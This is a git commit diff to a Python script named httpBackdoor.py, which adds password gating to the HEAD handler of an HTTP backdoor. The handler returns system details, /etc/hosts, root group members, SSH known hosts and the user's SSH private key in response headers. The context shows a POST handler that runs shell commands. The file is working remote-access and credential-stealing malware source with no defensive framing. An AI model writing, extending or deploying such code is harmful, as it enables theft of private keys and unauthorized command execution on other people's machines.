09023f37ef621edb26cf6224791225966da1df29
Joshua <16878148+SkryptKiddie@users.noreply.github.com>
2020-11-24 14:54:45 +0800

    added password support for HEAD handler

--- httpBackdoor.py
+++ httpBackdoor.py
@@ -2,7 +2,7 @@ import sys, subprocess, socket
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 class config:
-    bind_address = "0.0.0.0"
+    bind_address = "127.0.0.1"
     bind_port = 1337
     password = "password"
 
@@ -12,19 +12,23 @@ def execCommand(command):
 
 class ReqHandler(BaseHTTPRequestHandler): 
     def do_HEAD(self): # exfiltrate basic system information
-        self.send_response(200)
-        self.send_header("hostname", socket.gethostname()) # return system hostname
-        self.send_header("current_user", execCommand(command="whoami")) # get current user
-        self.send_header("current_directory", execCommand(command="pwd")) # get current directory
-        self.send_header("uptime", execCommand(command="uptime")) # get system uptime
-        self.send_header("uname", execCommand(command="uname -a")) # return uname output
-        self.send_header("local_ip", socket.gethostbyname(socket.gethostname())) # return local IP
-        self.send_header("ssh_knownhosts", execCommand(command="cat ~/.ssh/known_hosts")) # return all SSH known hosts
-        self.send_header("ssh_publickeys", execCommand(command="cat ~/.ssh/id_rsa.pub")) # return SSH public keys
-        self.send_header("ssh_privatekey", execCommand(command="cat ~/.ssh/id_rsa")) # return SSH private key
-        self.send_header("root_users", execCommand(command="grep root /etc/group")) # get all users with root access
-        self.send_header("hosts_file", execCommand(command="cat /etc/hosts")) # return the hosts file contents
-        self.end_headers()
+        password = str(self.headers["pwd"])[2:-1]
+        if str(password) == str(config.password):
+            self.send_response(200)
+            self.send_header("hostname", socket.gethostname()) # return system hostname
+            self.send_header("current_user", execCommand(command="whoami")) # get current user
+            self.send_header("current_directory", execCommand(command="pwd")) # get current directory
+            self.send_header("uptime", execCommand(command="uptime")) # get system uptime
+            self.send_header("uname", execCommand(command="uname -a")) # return uname output
+            self.send_header("local_ip", socket.gethostbyname(socket.gethostname())) # return local IP
+            self.send_header("ssh_knownhosts", execCommand(command="cat ~/.ssh/known_hosts")) # return all SSH known hosts
+            self.send_header("ssh_publickeys", execCommand(command="cat ~/.ssh/id_rsa.pub")) # return SSH public keys
+            self.send_header("ssh_privatekey", execCommand(command="cat ~/.ssh/id_rsa")) # return SSH private key
+            self.send_header("root_users", execCommand(command="grep root /etc/group")) # get all users with root access
+            self.send_header("hosts_file", execCommand(command="cat /etc/hosts")) # return the hosts file contents
+            self.end_headers()
+        else:
+            pass
 
     def do_POST(self): # run shell commands and return the output
         password = str(self.headers["pwd"])[2:-1]
